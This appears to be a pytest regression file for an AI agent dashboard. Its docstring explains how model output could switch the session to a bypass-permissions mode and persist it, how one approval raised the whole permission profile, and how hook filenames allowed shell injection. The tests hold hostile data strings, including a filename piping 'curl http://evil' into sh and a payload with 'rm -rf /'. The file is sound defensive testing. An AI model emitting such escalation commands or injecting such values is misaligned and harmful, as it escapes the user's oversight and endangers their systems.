"""Two ways the agent could raise its own ceiling, and one it could hand out.

THE PERMISSION PROFILE WAS A SENTENCE AWAY. The dashboard executes any
line of model output that begins with ACTION as a slash command, in every
mode. `/perms all_free` sets the dropdown, whose observer switches the
live engine to bypassPermissions AND writes the profile into the user's
settings file. So a session the user had deliberately put on Plan could
be talked into "asks nothing" -- for that session and every future one --
by the model emitting one line. The ladder is only a ladder if the thing
being restrained cannot climb it.

APPROVING ONE OPERATION UPGRADED THE PROFILE. Clicking Approve on a
single blocked call raised the whole profile a rung, and for any tool
name the branch did not recognise it raised it to the top rung. The user
was answering "may this one edit proceed", not "may everything proceed
from now on".

A HOOK COMMAND WAS A SHELL-INJECTION SINK. `${file}` was substituted into
a string run with shell=True, so a filename decided the command. The
module already imported shlex for this and never used it. The hook author
writes `ruff check ${file}` -- which is the documented example -- and a
file named by the model or found in an untrusted repo executes.
"""

from __future__ import annotations

import pathlib

import pytest

from delfin.agent import hooks as H


_TAB = pathlib.Path(__file__).resolve().parents[1] / "delfin" / "dashboard" / "tab_agent.py"


def _source() -> str:
    return _TAB.read_text(encoding="utf-8")


def _code_only() -> str:
    """Source with comment lines removed, so prose cannot satisfy a check."""
    return "\n".join(
        line for line in _source().splitlines()
        if not line.lstrip().startswith("#"))


# ---------------------------------------------------------------------------
# The profile is the user's to set
# ---------------------------------------------------------------------------

def test_profile_commands_are_named_in_one_place():
    from delfin.dashboard.tab_agent import _USER_ONLY_SLASH_COMMANDS as U
    assert "/perms" in U and "/perm-cycle" in U


def test_the_auto_executor_refuses_them():
    """Model output must not be able to reach the profile switch."""
    from delfin.dashboard.tab_agent import _slash_is_user_only

    for cmd in ("/perms all_free", "/perms  bypass", "/perm-cycle",
                "/PERMS all_free", "  /perms all_free  "):
        assert _slash_is_user_only(cmd), cmd


def test_ordinary_commands_are_still_auto_executable():
    from delfin.dashboard.tab_agent import _slash_is_user_only

    for cmd in ("/tab calc", "/orca functional b3lyp", "/mode solo",
                "/jobs", "/model haiku", "/permsomething"):
        assert not _slash_is_user_only(cmd), cmd


def test_the_refusal_is_wired_into_the_handler():
    code = _code_only()
    assert "_slash_is_user_only" in code
    # It must be consulted on the auto-execution path, not only defined.
    assert code.count("_slash_is_user_only") >= 2


# ---------------------------------------------------------------------------
# One approval is one approval
# ---------------------------------------------------------------------------

def test_approving_one_call_does_not_raise_the_profile():
    """The user answered a question about one operation."""
    code = _code_only()
    start = code.index("def _on_approve")
    window = code[start:start + 4000]
    assert "perm_dropdown.value = new_profile" not in window, (
        "a single approval still rewrites the session-wide profile")


# ---------------------------------------------------------------------------
# A filename is data, not command text
# ---------------------------------------------------------------------------

def test_a_hostile_filename_cannot_extend_the_hook_command():
    import shlex

    hostile = "x.py; curl http://evil | sh"
    cmd = H._expand("ruff check ${file}", {"file": hostile})
    # The test is not "the characters are gone" -- they must survive, or
    # the hook would be lied to about the filename. The test is that the
    # shell sees ONE argument, so nothing in it can become a command.
    assert shlex.split(cmd) == ["ruff", "check", hostile], shlex.split(cmd)


def test_an_ordinary_filename_is_unchanged_in_meaning():
    cmd = H._expand("ruff check ${file}", {"file": "delfin/agent/engine.py"})
    assert cmd in ("ruff check delfin/agent/engine.py",
                   "ruff check 'delfin/agent/engine.py'")


def test_structured_arguments_are_still_quoted():
    cmd = H._expand("echo ${payload}", {"payload": {"a": "b; rm -rf /"}})
    assert "rm -rf /" in cmd
    assert cmd.count("rm -rf /") == 1
    # It must not be able to end the echo and start a new command.
    import shlex
    assert len(shlex.split(cmd)) == 2, shlex.split(cmd)


def test_an_unknown_placeholder_is_left_alone():
    assert H._expand("echo ${nope}", {}) == "echo ${nope}"


def test_the_quoting_helper_is_actually_used():
    src = pathlib.Path(H.__file__).read_text(encoding="utf-8")
    code = "\n".join(l for l in src.splitlines()
                     if not l.lstrip().startswith("#"))
    assert "shlex.quote" in code, (
        "shlex is imported for this and was never called")
